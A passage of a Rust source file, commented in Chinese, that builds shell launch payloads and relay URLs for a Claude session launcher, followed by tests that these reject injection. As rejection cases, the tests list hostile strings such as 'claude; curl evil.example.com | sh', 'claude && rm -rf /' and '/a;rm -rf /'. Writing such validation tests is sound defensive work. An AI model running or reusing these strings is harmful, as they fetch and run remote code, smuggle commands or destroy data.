/// 「今天数出来的 N」活着。⇒ 形参改名，闸的分母回到「这个函数被谁提到」本身。
pub fn relay_injection_for(
    account_id: Option<&str>,
    rows: &[String],
    running: bool,
    sid: Option<&str>,
    agent: &str,
) -> Result<Option<String>, String> {
    let Some(id) = account_id else {
        return Ok(None);
    };
    if !rows.iter().any(|r| r == id) {
        return Ok(None);
    }
    if !running {
        // ★ `KH2B2`②：**「中转没起来」不许是静默的**。
        //   把它渲染成一条指向没人听的口的 URL，症状会长成「claude 连不上 API」——
        //   与网络故障同形，而这一条是我们自己的责任。⇒ 在**起会话那一侧**当场说出来。
        return Err(refuse(format!(
            "账号 {id:?} 配了第三方端点（中转表里有它这一行），但**本机中转没在跑** ——\n\
             这一发要是照旧起出去，claude 那边会报一个与网络故障同形的连接失败，\
             而真正的原因在我们这一侧。\n\
             ⇒ 先起本机后端（设置 → 本机 daemon），或把该账号那一行从凭据文件里去掉。"
        )));
    }
    Ok(Some(relay_base_url(
        RELAY_PORT,
        agent,
        id,
        &route_key_for_session(sid),
    )?))
}

#[cfg(test)]
mod tests {
    /// P1：**`REFUSE_TAG` 是跨语言双写点，两侧必须逐字一致**。
    ///
    /// 照仓里现成的形状写（`launch.rs::the_posix_marker_is_the_one_the_frontend_matches_on`）——
    /// `include_str!` 读前端那份，把字面量抠出来对拍。改一边不改另一边 ⇒ 红。
    ///
    /// 为什么非钉不可：前端靠这个标区分「载荷渲染被拒」（不许回落）与「IPC 异常」（可回落）。
    /// 标不一致 ⇒ 业务拒绝被当成通道异常 ⇒ **回落到兜底渲染器**，
    /// 而它对同样输入未必拒 ⇒ 一次 fail-closed 悄悄变回 fail-open，**且没有任何东西会报错**。
    #[test]
    fn the_refuse_tag_is_the_same_string_on_both_sides() {
        const RUNNER: &str = include_str!("../../../../src/remote-launch-run.ts");
        let key = "const REFUSE_TAG = \"";
        let at = RUNNER
            .find(key)
            .expect("前端找不到 REFUSE_TAG —— 抽取坏了，本断言在空转");
        let rest = &RUNNER[at + key.len()..];
        let front = &rest[..rest.find('"').expect("字面量没收尾")];
        assert!(
            front.chars().count() >= 4,
            "抽到的标太短（{front:?}）—— 抽取坏了"
        );
        assert_eq!(
            front,
            super::REFUSE_TAG,
            "\n前端按 {front:?} 认业务拒绝，而后端打的是 {:?} —— 两侧漂了。\n\
             后果不是报错，是**静默回落**：业务拒绝被当成 IPC 异常 ⇒ 走兜底渲染器 ⇒ \n\
             一次 fail-closed 变回 fail-open。两边必须一起改。",
            super::REFUSE_TAG
        );
    }

    /// P1-Y2：**渲染路径上的业务拒绝，一条都不许裸写** —— 必须经 [`refuse`] 打标。
    ///
    /// # 为什么钉「构造方式」而不是「哪些串是拒绝」
    ///
    /// 后者就是 `topbar-icons.vitest.ts` 头注骂过的「**按字符黑名单取样**」：
    /// 判据去猜哪些文案算拒绝 ⇒ 新增一条忘了登记就漏。钉构造口则相反 ——
    /// **新增拒绝理由忘了打标，这条会红**，不靠人记得。
    ///
    /// # 它逮到过什么（不是假想）
    ///
    /// 本件第一遍改写时**漏了两处多行 `Err(format!(…))`**（参数放行集 / launcher 注入字符），
    /// 正是这条判据的目标形状 —— 单行的好改，多行的容易漏。
    ///
    /// # 它管不了什么（诚实边界 9a/9b）
    ///
    /// ⚠ 人群限于**本文件**。拒绝理由若长到别的文件里，这条看不见 ——
    /// 所以下面带一条**人群自检**：本文件必须真的是渲染路径的拒绝所在地（`refuse` 有调用者）。
    /// ⚠ 打标是**字符串约定不是类型**：手写一个带同样前缀的普通错误串也会被 TS 当成业务拒绝（`U6`）。
    #[test]
    fn every_business_rejection_is_tagged() {
        let src = guard_core::production_code(include_str!("payload.rs"));
        // 人群自检 —— **不数定义行**〔D 阶段补审 08-11 订正〕。
        //
        // 原版是 `src.matches("refuse(").count() >= 2`，而生产段实得 **10** 处，
        // 其中 **1 处是 `pub(crate) fn refuse(` 定义行自己** ⇒ 阈值实际只要求
        // 「有 1 个调用方」。诊断词却写着「要么拒绝点被搬走了」——**搬走 8 处它不知道**。
        // ⇒ 排掉定义行，阈值按今天的真实调用点数取（**只许降到这个数以上**，
        // 少了就说明拒绝点在流失，那正是要红的时刻）。
        let callers = src
            .lines()
            .filter(|l| !l.contains("fn refuse("))
            .map(|l| l.matches("refuse(").count())
            .sum::<usize>();
        assert!(
            callers >= 8,
            "本文件生产段里 `refuse(` 的**调用点**只剩 {callers} 处（08-11 实测 9）—— 人群在流失。\n\
             要么拒绝点被搬走了（那这条判据该跟着搬），要么打标被摘了。\n\
             ⚠ 原版把定义行也算进去、阈值又只有 2，等于「有一个调用方就算数」。"
        );
        // ⚠ **第一版是假绿的，形状记下来**：原来扫的是「以 `return Err(` **开头**的行」，
        // 而 `Some("x") => return Err(…)` 这种 `match` 臂里 `return` 不在行首 ⇒ **漏**。
        // 变异当场证伪（造了一处裸 `Err` 而判据照样绿）。
        // ⇒ 改成扫**每一处 `Err(`**，看它后面紧跟的是不是 `refuse(`，与它在行里的位置无关。
        let mut offenders = Vec::new();
        for (i, line) in src.lines().enumerate() {
            let t = line.trim_start();
            // `Err(` 的每一次出现（一行可能有多次）
            for (col, _) in t.match_indices("Err(") {
                let rest = &t[col + "Err(".len()..];
                // 打了标 = 紧跟 `refuse(`；`Ok(`/`.map_err(`/类型位置的 `Err` 不在此列
                if rest.trim_start().starts_with("refuse(") {
                    continue;
                }
                // ⚠ **原来这里无条件排除 `Err(e)` / `Err(err)` / `Err(r)`**（本意是排模式匹配）。
                // 实测：本文件生产段被它排掉的是 **0 处** —— 它今天一个真实用途都没有，
                // 却给未来开了个口：`let e = format!("坏输入 {x:?}"); return Err(e);`
                // **构造一个裸错误值也会被跳过**，而那不是刁钻写法，是最常见的重构结果。
                // ⇒ 删掉。真出现模式匹配再按**那一处的形状**精确排除（`=>` 在同一行之类），
                // 不预先开一个按标识符名字放行的口。
                offenders.push(format!(
                    "{}: {}",
                    i + 1,
                    t.chars().take(72).collect::<String>()
                ));
            }
        }
        // ★ **另外三条出口**〔D 阶段补审 08-11 新增〕：判据原来只看 `Err(`，
        // 而这三种同样能产出一个未打标的业务拒绝，且今天生产段**各 0 处** ——
        // 这是**禁令**不是抽样：它们一旦出现就绕过了整条打标纪律。
        for verb in ["ok_or_else(", "ok_or(", ".map_err("] {
            let n = src.matches(verb).count();
            assert_eq!(
                n, 0,
                "生产段出现了 `{verb}`（{n} 处）—— 它能产出一个**没经 `refuse()`** 的错误串。\n\
                 TS 侧按 `REFUSE:` 标分流；不打标的拒绝会被当成 IPC 异常 ⇒ **回落到兜底渲染器**\n\
                 ⇒ 一次 fail-closed 当场变 fail-open。要用它就先让它经 `refuse(...)`。"
            );
        }

        assert!(
            offenders.is_empty(),
            "渲染路径上有**没打标**的业务拒绝：\n  {}\n\n\
             全部要经 `refuse(...)`（见它的头注）。不打标 ⇒ TS 侧 `sendIntoViaDaemon` 分不出\n\
             「载荷渲染被拒」与「IPC 异常」⇒ 会**回落到兜底渲染器**，而它对同样输入未必拒\n\
             ⇒ 一次 Rust 侧的 fail-closed 当场变成 fail-open。",
            offenders.join("\n  ")
        );
    }

    /// ★★ **`launcher` 也要拒绝注入字符**〔audit-0805 08-08，Phase G 第 93 件〕。
    ///
    /// # 先核出来的不对称
    ///
    /// `render_payload` 对 `args` 逐个过 `arg_is_join_safe`（白名单），而 **`launcher`
    /// 一个检查都没有** —— 它被直接 `push` 进 `argv` 再 `join(" ")`。
    /// 而 `render_launch_payload` 是**注册过的 tauri 命令**：`launcher` 来自 webview。
    ///
    /// ⚠⚠ **次轮先核订正了赌注**：这道检查是**纵深不是边界** —— `daemon_send_into`
    /// 的 `payload` 同样来自 webview 且只受「非空/长度/无控制字符」约束，
    /// 前端本来就能绕过本函数直接送任意载荷。本条挡的是**缺陷**（走文档化那条路时
    /// 把注入串拼进载荷）与**姿态不一致**（同函数 `args` 有闸而 `launcher` 没有）。
    /// 真边界在 daemon 的 `admit` 与前端执行面 —— 见 `ROADMAP §5` 那条登记。
    ///
    /// 该字段的头注写着「已 sanitize 过的 launcher …… 本 crate 收的是**结果**」——
    /// 那是**调用约定**，不是这一侧的保证：wire 那条路（`launch_wire.rs`）把
    /// `&req.launcher` 原样传了进来，中间没有任何净化。
    ///
    /// # 为什么用「拒绝这几个字符」而不是复用别处的白名单
    ///
    /// 仓里已有两份 launcher 策略，**各自服务不同的合法形状**：
    /// · TS 的 `sanitizeRemoteLauncher`：拒 ``[;|&$`<>\r\n]`` ⇒ 回落默认 launcher；
    /// · Rust 的 `history::sanitize_launcher`：白名单（字母数字 `- _ .` 空格）⇒ `Err`。
    ///
    /// 后者**排掉了 `/`**，而远端 launcher 合法地可以是 `/usr/local/bin/claude`；
    /// 直接复用它会把正当用法判死（**收太紧 = 把一个洞换成一个回归**，第 86 件的教训）。
    /// ⇒ 这里镜像**今天真正管着这条路**的那份策略（TS 那条）的字符集，
    /// 但按本函数的既有惯例**返回 `Err` 而不是静默回落** —— 与 `args` 那一支一致：
    /// 拒绝要让调用方看得见，静默替换会让人以为自己填的生效了。
    #[test]
    fn the_launcher_is_refused_when_it_carries_injection_chars() {
        for bad in [
            "claude; curl evil.example.com | sh",
            "claude && rm -rf /",
            "claude `id`",
            "claude $(id)",
            "claude\nrm -rf /",
            "claude > /etc/passwd",
        ] {
            let r = super::render_payload(&super::PayloadSpec {
                env: &[],
                cwd: None,
                launcher: bad,
                args: &[],
                wrap: &[],
            });
            assert!(
                r.is_err(),
                "`launcher` = {bad:?} 被原样拼进了载荷：{:?}\n\
                 ★ 这条路是 tauri 命令 `render_launch_payload` ⇒ `launcher` 来自 webview，\n\
                 而渲出来的载荷会被**键进用户的会话执行**。\n\
                 ⚠ 同一个函数对 `args` 逐个过白名单，`launcher` 却一个检查都没有 —— \n\
                 那份不对称正是本条要挡的。",
                r.ok()
            );
        }
        // 正例：合法 launcher 不许被误伤（收太紧 = 把一个洞换成一个回归）。
        for ok in [
            "claude",
            "/usr/local/bin/claude",
            "wsl claude",
            "claude-code.exe",
        ] {
            let r = super::render_payload(&super::PayloadSpec {
                env: &[],
                cwd: None,
                launcher: ok,
                args: &[],
                wrap: &[],
            });
            assert!(r.is_ok(), "合法 launcher {ok:?} 被拒了：{:?}", r.err());
        }
    }

    /// ★★ **载荷的拼装只许有一份 Rust 实现**〔audit-0805 08-08，Phase G 第 62 件，E3〕。
    ///
    /// 本模块头注第一行逐字写着「`env 前缀 → cd → argv → wrap` 那一段串的
    /// **唯一 Rust 真相源**」。那句话撑着一条真实性质：载荷会被 `send-keys` 原样
    /// 键进会话，拼装一旦有第二份，两份的**引用规则与拼接顺序**就会各自演化 ——
    /// 而那正是本工作区反复在治的「同一职责多处落地」（E3）。
    ///
    /// ⇒ 而它**只是散文**（08-08 横扫「唯一」类声称时逮到：没有任何判据读它）。
    ///
    /// # 钉法
    ///
    /// 人群 = 整棵 monitor 源码树的生产段里，每一处拼 `cd <目录> && ` 这个**载荷片段**
    /// 的地方。今天恰好一处（本模块的 `render_payload`）。先量过误红面：全树只此一处。
    ///
    /// ⚠ **不钉 argv / wrap 那两段**：它们没有同样窄的特征串，硬造一个匹配单位
    /// 会比事实大（F24 那一族）。**只钉钉得住的那一段**，并把这句话留在这里 ——
    /// 别让后来者以为整条拼装都被守住了。
    #[test]
    fn the_payload_cd_prefix_is_assembled_in_exactly_one_place() {
        // 运行时拼：写成字面量的话，本条自己的诊断文案也会被数进去（F58 记过两次）。
        let frag = format!("cd {}{} && ", "{}", "");
        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src");
        let mut sites: Vec<String> = Vec::new();
        let mut files: Vec<(std::path::PathBuf, String)> = guard_core::scan_tree!(&root, &["rs"]);
        // ⚠ `scan_tree!` 摘除调用者自己，而唯一那处就在本文件里（F60 栽过一次）。
        files.push((
            std::path::PathBuf::from("payload.rs"),
            include_str!("payload.rs").to_string(),
        ));
        for (path, src) in files {
            let name = path
                .file_name()
                .and_then(|s| s.to_str())
                .unwrap()
                .to_string();
            for line in guard_core::production_code(&src).lines() {
                if line.contains(frag.as_str()) {
                    sites.push(format!("{name}: {}", line.trim()));
                }
            }
        }
        assert_eq!(
            sites.len(),
            1,
            "载荷的 `cd <目录> && ` 片段在 monitor 生产段里出现了 {} 处（应恰好 1）：\n  {}\n\n\
             ⚠ 头注第一行写着本模块是「那一段串的**唯一 Rust 真相源**」。\n\
             第二份拼装会与这一份各自演化引用规则与拼接顺序，而载荷是**原样键进会话**的 —— \n\
             漂开的后果不是「样式不一致」，是**一边转义、一边不转义**。\n\
             真要复用，调 `render_payload`。",
            sites.len(),
            sites.join("\n  ")
        );
    }
    use super::*;

    /// ★ 本 crate 存在的理由之一：命令面校验必须用 `acct-core` 的**并集**，
    /// 不是 `history.rs` 那张 U7-3 之前的旧表。
    ///
    /// 这六段码位是并集有、旧表没有的 —— 变异（把 `is_deceptive_char` 换回旧表）时
    /// 本测试逐个点名报出来。
    #[test]
    fn command_safety_uses_the_acct_core_union_not_the_pre_u7_3_table() {
        for (name, c) in [
            ("U+1680 Ogham space", '\u{1680}'),
            ("U+2000 en quad", '\u{2000}'),
            ("U+200A hair space", '\u{200a}'),
            ("U+202F narrow NBSP", '\u{202f}'),
            ("U+205F medium math space", '\u{205f}'),
            ("U+2060 word joiner", '\u{2060}'),
            ("U+2064 invisible plus", '\u{2064}'),
            ("U+3000 ideographic space", '\u{3000}'),
        ] {
            let dir = format!("/home/u/.claude-accts/{c}z");
            assert!(
                !config_dir_command_safe(&dir),
                "{name} 必须被拒（它在 acct-core 并集里，而 history.rs 的旧表没有）"
            );
        }
    }

    #[test]
    fn command_safety_keeps_everything_the_old_table_already_rejected() {
        for bad in [
            "relative/path",
            "/",
            "/a/../b",
            "/a/..",
            "/a'b",
            "/a\"b",
            "/a`b",
            "/a$b",
            "/a;b",
            "/a|b",
            "/a&b",
            "/a<b",
            "/a>b",
            "/a*b",
            "/a?b",
            "/a(b",
            "/a)b",
            "/a!b",
            "/a\\b",
            "/a\u{0000}b",
            "/a\u{001f}b",
            "/a\u{007f}b",
            "/a\u{0085}b",
            "/a\u{009f}b",
            "/a\u{00a0}b",
            "/a\u{200b}b",
            "/a\u{200f}b",
            "/a\u{2028}b",
            "/a\u{202e}b",
            "/a\u{2069}b",
            "/a\u{feff}b",
        ] {
            assert!(!config_dir_command_safe(bad), "应拒: {bad:?}");
        }
    }

    #[test]
    fn command_safety_allows_the_paths_people_actually_have() {
        for ok in [
            "/home/u/.claude-accts/z",
            "/home/用户/带 空格/z", // 普通空格与中文是允许的（单引号里无害且常见）
            "/opt/a-b_c.d/z",
        ] {
            assert!(config_dir_command_safe(ok), "应放行: {ok:?}");
        }
    }

    #[test]
    fn account_prefix_is_three_states_not_two() {
        assert_eq!(config_dir_prefix_posix(None).unwrap(), "");
        assert_eq!(
            config_dir_prefix_posix(Some(&Account::Base)).unwrap(),
            "unset CLAUDE_CONFIG_DIR; "
        );
        assert_eq!(
            config_dir_prefix_posix(Some(&Account::Named {
                config_dir: "/home/u/.claude-accts/z"
            }))
            .unwrap(),
            "export CLAUDE_CONFIG_DIR='/home/u/.claude-accts/z'; "
        );
    }

    #[test]
    fn empty_config_dir_is_bad_data_not_account_zero() {
        let e = config_dir_prefix_posix(Some(&Account::Named { config_dir: "  " })).unwrap_err();
        assert!(e.contains("空的"), "{e}");
    }

    #[test]
    fn illegal_config_dir_never_reaches_the_command() {
        let e = config_dir_prefix_posix(Some(&Account::Named {
            config_dir: "/a;rm -rf /",
        }))
        .unwrap_err();
        assert!(e.contains("拒绝拼入命令"), "{e}");
    }

    #[test]
    fn payload_order_is_env_then_cd_then_argv() {
        let nested = ["CLAUDECODE", "CLAUDE_CODE_ENTRYPOINT"];
        let spec = PayloadSpec {
            env: &[
                EnvOp::ExportConfigDir {
                    value: "/home/u/.claude-accts/z",
                },
                EnvOp::UnsetNestedEnv { keys: &nested },
            ],
            cwd: Some("/w"),
            launcher: "claude",
            args: &["--resume", "s1"],
            wrap: &[],
        };
        assert_eq!(
            render_payload(&spec).unwrap(),
            "export CLAUDE_CONFIG_DIR='/home/u/.claude-accts/z'; \
             unset CLAUDECODE CLAUDE_CODE_ENTRYPOINT; cd '/w' && claude --resume s1"
        );
    }

    #[test]
    fn no_cwd_means_no_cd_segment() {
        let spec = PayloadSpec {
            env: &[EnvOp::UnsetConfigDir],
            cwd: None,
            launcher: "claude",
            args: &[],
            wrap: &[],
        };
        assert_eq!(
            render_payload(&spec).unwrap(),
            "unset CLAUDE_CONFIG_DIR; claude"
        );
    }

    /// wrap 只包住 argv —— **不包 env 前缀、不包 `cd`**。
    /// 包错了会折叠出 `( …; exec unset A B; claude )`，实测 rc=127。
    #[test]
    fn wrap_folds_inside_out_and_only_wraps_argv() {
        let spec = PayloadSpec {
            env: &[EnvOp::UnsetConfigDir],
            cwd: Some("/w"),
            launcher: "claude",
            args: &[],
            wrap: &[
                WrapSpec {
                    order: 2,
                    prelude: "outer",
                },
                WrapSpec {
                    order: 1,
                    prelude: "inner",
                },
            ],
        };
        assert_eq!(
            render_payload(&spec).unwrap(),
            "unset CLAUDE_CONFIG_DIR; cd '/w' && ( outer; exec ( inner; exec claude ) )"
        );
    }

    /// ★ R1（审计发现）：`render_payload` 那条路此前**完全绕过**本 crate 自己的 configDir 校验。
    /// 这类差异「TS 生成夹具」的机制结构上抓不到（TS 侧生成时就 throw，用例进不了夹具）
    /// ⇒ 只能靠类型 + 本测试。
    #[test]
    fn render_payload_refuses_illegal_config_dir_just_like_the_prefix_entry() {
        for bad in ["/a'b", "rel/x", "/", "/a/../b", "/a\u{3000}b"] {
            let spec = PayloadSpec {
                env: &[EnvOp::ExportConfigDir { value: bad }],
                cwd: None,
                launcher: "claude",
                args: &[],
                wrap: &[],
            };
            let e = match render_payload(&spec) {
                Ok(out) => panic!("非法 configDir {bad:?} 竟被渲染进载荷：{out}"),
                Err(e) => e,
            };
            assert!(e.contains("CLAUDE_CONFIG_DIR"), "{e}");
        }
    }

    /// ★ R2（审计发现）：空串**不是**「没有」。TS 侧把 `""` 当没有（`cd ''` / `CLAUDE_CONFIG_DIR=''`
    /// 两种坏产物），本 crate 刻意分歧 —— 见 `render_payload` 头注与 INVARIANTS §33b。
    #[test]
    fn empty_strings_are_bad_data_not_absence() {
        let empty_cwd = PayloadSpec {
            env: &[],
            cwd: Some(""),
            launcher: "claude",
            args: &[],
            wrap: &[],
        };
        assert!(
            render_payload(&empty_cwd).is_err(),
            "空 cwd 应回 Err，不是 `cd ''`"
        );
        let empty_dir = PayloadSpec {
            env: &[EnvOp::ExportConfigDir { value: "" }],
            cwd: None,
            launcher: "claude",
            args: &[],
            wrap: &[],
        };
        assert!(
            render_payload(&empty_dir).is_err(),
            "空 configDir 应回 Err，不是 `CLAUDE_CONFIG_DIR=''`（那是静默串号）"
        );
        let empty_keys = PayloadSpec {
            env: &[EnvOp::UnsetNestedEnv { keys: &[] }],
            cwd: None,
            launcher: "claude",
            args: &[],
            wrap: &[],
        };
        assert!(
            render_payload(&empty_keys).is_err(),
            "空键表应回 Err，不是裸 `unset ; `"
        );
    }

    /// ★ U8c-2a：`args` 白名单 —— 会裂成多个参数 / 会另起一条命令的那一类不可表示。
    /// **合法输入的字节一个都没变**（黄金串对拍还在跑）。
    #[test]
    fn args_that_would_split_or_inject_are_refused() {
        for bad in [
            "a b",
            "x; rm -rf /",
            "a\nb",
            "a|b",
            "a$b",
            "a`b`",
            "",
            "a'b",
        ] {
            let spec = PayloadSpec {
                env: &[],
                cwd: None,
                launcher: "claude",
                args: &[bad],
                wrap: &[],
            };
            assert!(
                render_payload(&spec).is_err(),
                "arg {bad:?} 应被拒（载荷是 join(\" \") 拼的）"
            );
        }
        // 反向自检：今天 `args` 真实装的东西必须照常通过，否则上面全是空转。
        let ok = PayloadSpec {
            env: &[],
            cwd: None,
            launcher: "claude",
            args: &["--resume", "0b2f7a1e-3c4d-4e5f-8a9b-0c1d2e3f4a5b"],
            wrap: &[],
        };
        assert_eq!(
            render_payload(&ok).unwrap(),
            "claude --resume 0b2f7a1e-3c4d-4e5f-8a9b-0c1d2e3f4a5b"
        );
    }

    /// ★ U8c-2a：用量探针两态 —— 没有第三态，空串是坏数据。
    #[test]
    fn usage_probe_payload_is_two_states_and_never_bare() {
        let nested = ["CLAUDECODE", "CLAUDE_CODE_ENTRYPOINT"];
        assert_eq!(
            usage_probe_payload(Some("/h/.claude-accts/z"), &nested, "claude").unwrap(),
            "export CLAUDE_CONFIG_DIR='/h/.claude-accts/z'; \
             unset CLAUDECODE CLAUDE_CODE_ENTRYPOINT; claude"
        );
        assert_eq!(
            usage_probe_payload(None, &nested, "claude").unwrap(),
            "unset CLAUDE_CONFIG_DIR; unset CLAUDECODE CLAUDE_CODE_ENTRYPOINT; claude"
        );
        assert!(
            usage_probe_payload(Some(""), &nested, "claude").is_err(),
            "空串是坏数据，不是账号 0"
        );
        // ★ 最要紧的一条：**两态都必须带账号前缀**，绝不退化成裸载荷（静默串号）。
        for dir in [Some("/h/.claude-accts/z"), None] {
            let p = usage_probe_payload(dir, &nested, "claude").unwrap();
            assert!(
                p.starts_with("export CLAUDE_CONFIG_DIR=")
                    || p.starts_with("unset CLAUDE_CONFIG_DIR;"),
                "载荷没有账号表态，会探到远端 rc 里的默认号：{p}"
            );
        }
    }

    #[test]
    fn model_export_is_quoted() {
        let spec = PayloadSpec {
            env: &[EnvOp::ExportModel { value: "opus" }],
            cwd: None,
            launcher: "claude",
            args: &[],
            wrap: &[],
        };
        assert_eq!(
            render_payload(&spec).unwrap(),
            "export ANTHROPIC_MODEL='opus'; claude"
        );
    }

    // ═════════════════════════════════════════════════════════════════════
    // `K-H2b`：接上注入点
    // ═════════════════════════════════════════════════════════════════════

    /// ★★ `KH2B4` 的 monitor 半 —— [`RELAY_ROUTE_SAMPLE`] 是**构造口真的产出的那一串**。
    ///
    /// 它与 daemon 侧那条 `include_str!` 本文件的判据一起，把两侧焊在同一行样例上：
    /// 谁改了这边的拼法而没改样例 ⇒ 本条红；样例改了而 daemon 那边解析出别的段 ⇒ 那边红。
    #[test]
    fn the_relay_route_sample_is_what_the_builder_really_produces() {
        // 期望值是**手写字面量**（不是拿被测函数算出来的，否则自证恒绿）。
        assert_eq!(
            relay_route_path("claude-code", "acct-a", "k-0123456789abcdef").unwrap(),
            "/s/claude-code/acct-a/k-0123456789abcdef"
        );
        assert_eq!(
            RELAY_ROUTE_SAMPLE,
            relay_route_path("claude-code", "acct-a", "k-0123456789abcdef").unwrap(),
            "跨半边那行样例与构造口漂开了 —— daemon 侧那条判据量的就不是生产段的拼法了"
        );
    }

    /// ★ **fail-closed**：任一段过不了白名单就当场拒，绝不拼一条会变成 404 的 URL。
    #[test]
    fn the_route_key_builder_refuses_a_segment_that_would_become_a_lookup_miss() {
        // 非空对照排最前：先证明这把尺子认得合法的那一形，否则下面整个循环可能只是恒 `Err`。
        assert!(
            relay_route_path("claudecode", "acct-a", "sid-1").is_ok(),
            "这把尺子是瞎的 —— 连合法的那一形都拒"
        );
        // 分母 = 我列出的这 6 形，**不是**「所有非法输入」。
        for (a, acc, k) in [
            ("", "acct", "sid"),
            ("agent", "", "sid"),
            ("agent", "acct", ""),
            ("agent", "acct/other", "sid"),
            ("agent", "..", "sid"),
            ("agent", "has.dot", "sid"),
        ] {
            let r = relay_route_path(a, acc, k);
            assert!(r.is_err(), "这一形不该拼得出来：{a:?}/{acc:?}/{k:?}");
            assert!(
                r.unwrap_err().starts_with(REFUSE_TAG),
                "业务拒绝必须带标记，否则前端会把它当 IPC 异常去回落"
            );
        }
        // 完整 URL 那一层也要跟着拒（别在外面又拼一次绕过去）。
        assert!(relay_base_url(8788, "agent", "a/b", "sid").is_err());
        assert_eq!(
            relay_base_url(8788, "claude-code", "acct-a", "k-0123456789abcdef").unwrap(),
            "http://127.0.0.1:8788/s/claude-code/acct-a/k-0123456789abcdef"
        );
    }

    /// ★★ `KH2B4`「**只有一个构造口**」的 monitor 半 —— 计数，不是「有没有一个函数」。
    ///
    /// 多一处能拼这条 URL 的地方，就多一处可以各自答错**同一个问题**，
    /// 而答错的症状是「一个查不出来的 404」（`KL7` 第 1 条）。
    ///
    /// ⚠ 人群是**本文件的生产段**（`include_str!("payload.rs")` 再 `guard_core::production_code`
    /// 剥掉 `#[cfg(test)]`）—— **不是本 crate、更不是全仓**。分母写在这里，别把它读宽。
    /// 全仓那一格的读数与量法住 `relay_env_prefix_posix` 的头注（它是读数，不是断言）。
    #[test]
    fn only_one_place_in_this_file_exports_the_relay_base_url() {
        let src = include_str!("payload.rs");
        let prod = guard_core::production_code(src);
        // 抽取器自检：剥完还得看得见东西，且**确实剥掉了**测试段那些字面量。
        assert!(
            prod.len() > 5_000,
            "剥完只剩 {} 字节 —— 剥过头了，本条会零命中地绿",
            prod.len()
        );
        assert!(
            !prod.contains("这把尺子是瞎的"),
            "测试段没剥干净 —— 下面的计数会把判据自己的字面量数进去"
        );
        assert_eq!(
            prod.matches("export ANTHROPIC_BASE_URL=").count(),
            1,
            "**本文件**生产段里产出 `export ANTHROPIC_BASE_URL=` 的地方不再是 1 处。\n\
             ⇒ 两处各拼一遍就会各自答错同一个问题，而症状是中转回一个查不出来的 404。\n\
             要加第二处，先说清它为什么不能调 `relay_env_prefix_posix`。"
        );
        assert_eq!(
            prod.matches("format!(\"{RELAY_ROUTE_PREFIX}").count(),
            1,
            "路由键的拼串处不再是 1 处 —— 见 `relay_route_path` 头注：\n\
             老三段键**不会被解析器拒掉**，它被重读成另一条四段路由、解析成功，\n\
             挡它的是「表里查不到」而那在另一个文件里。"
        );
    }

    /// ★★★ `KH2B5`（`§0e` 裁一）：**没配第三方 key 的号一个字节都不受影响。**
    ///
    /// 量法是**对照**：同一个函数、同一条路径，只有「表里有没有这一行」不同。
    #[test]
    fn an_account_with_no_row_in_the_relay_table_is_not_routed_through_the_relay() {
        let rows = vec!["acct-a".to_string()];
        // ① 表里有这一行 ⇒ 注入（非空对照：证明这把尺子不是恒 `None`）。
        let got = relay_injection_for(Some("acct-a"), &rows, true, Some("sid-1"), "claude-code")
            .expect("表里有行、中转在跑 ⇒ 该拼得出来");
        assert_eq!(
            got.as_deref(),
            Some("http://127.0.0.1:8788/s/claude-code/acct-a/sid-1"),
            "注入串不是预期的那一条"
        );
        // ② 表里**没有**这一行 ⇒ 一个字节都不注入。
        assert_eq!(
            relay_injection_for(Some("acct-b"), &rows, true, Some("sid-1"), "claude-code").unwrap(),
            None,
            "订阅号（中转表里没有它这一行）被接进了中转 —— 那是纯风险零收益，\
             而且它在中转那边只会拿到一个 404"
        );
        // ③ 调用方没说是哪个号 ⇒ 同样不注入（空值 ≠ 「用默认那一行」）。
        assert_eq!(
            relay_injection_for(None, &rows, true, Some("sid-1"), "claude-code").unwrap(),
            None
        );
        // ④ 一条空账号的行**也算有行**（`KL7` 第 3 条：keyless 透传是显式的一条路）。
        //    这里靠的是「行在不在」，与那一行有没有 key 无关 —— 本函数收的就是 id 表。
        let rows2 = vec!["acct-keyless".to_string()];
        assert!(
            relay_injection_for(Some("acct-keyless"), &rows2, true, None, "claude-code")
                .unwrap()
                .is_some()
        );
    }

    /// ★★ `KH2B2`②：**「中转没起来」不是静默的** —— 在起会话那一侧就说得出话。
    #[test]
    fn a_relay_that_is_not_running_is_refused_out_loud_at_launch_time() {
        let rows = vec!["acct-a".to_string()];
        let e = relay_injection_for(Some("acct-a"), &rows, false, Some("sid-1"), "claude-code")
            .expect_err("中转没在跑却照样渲染出去 —— 那会长成「claude 连不上 API」");
        assert!(e.starts_with(REFUSE_TAG), "业务拒绝要带标记：{e}");
        assert!(
            e.contains("中转没在跑"),
            "错误文案得说出真正的原因（不是一句通用失败）：{e}"
        );
        // 非空对照：同一条路径、只把「中转在跑」翻过来 ⇒ 不再报错。
        assert!(
            relay_injection_for(Some("acct-a"), &rows, true, Some("sid-1"), "claude-code").is_ok()
        );
        // ⚠ 表里没有这一行的号**不受这条闸影响** —— 中转没起来也照旧起得来。
        assert_eq!(
            relay_injection_for(Some("acct-b"), &rows, false, None, "claude-code").unwrap(),
            None,
            "中转没起来把订阅号也挡了 —— 那正是「所有号都接」那条被否决的路的症状"
        );
    }

    /// ★ `KH2B6`：`<key>` 段那条**写下来的规则**只有一份实现。
    #[test]
    fn the_key_segment_is_the_sid_when_resuming_and_a_nonce_when_starting_fresh() {
        // resume：逐字用那条会话的 sid。
        assert_eq!(
            route_key_for_session(Some("0198f0d2-1111-4222-8333-444455556666")),
            "0198f0d2-1111-4222-8333-444455556666"
        );
        // 新开：铸一个 nonce —— 它必须过得了路由段白名单，否则整条 URL 拼不出来。
        let a = route_key_for_session(None);
        let b = route_key_for_session(None);
        assert!(
            relay_segment_is_safe(&a),
            "铸出来的 nonce 当不了路由段：{a:?}"
        );
        assert_ne!(a, b, "两次铸出同一个值 —— 那不是 nonce");
        // sid 当不了路由段时也回落到 nonce（不为一段惰性的标签把起会话整个拒掉）。
        let c = route_key_for_session(Some("has/slash"));
        assert!(relay_segment_is_safe(&c));
        assert_ne!(c, "has/slash");
    }

    /// ★★★ `K-H2b` 裁三的第三条路：**ccm 的容器路要把中转 base URL 转发过 tmux 边界。**
    ///
    /// # 它治的是什么（与 `R08` 逐字同型）
    ///
    /// 注入发生在 `ccm` **外侧**（`relay_env_prefix_posix`，本文件唯一发射点）。
    /// 走容器路时，载荷是经 `send-keys` 打进 **tmux server fork 出来的新 shell** 的，
    /// 而 `update-environment` 的默认列表**不含**这个变量 ⇒ 外侧那句 export
    /// 在 tmux 边界被整个吃掉。症状：**中转明明接上了，走 tmux 的会话却全是官方直连**
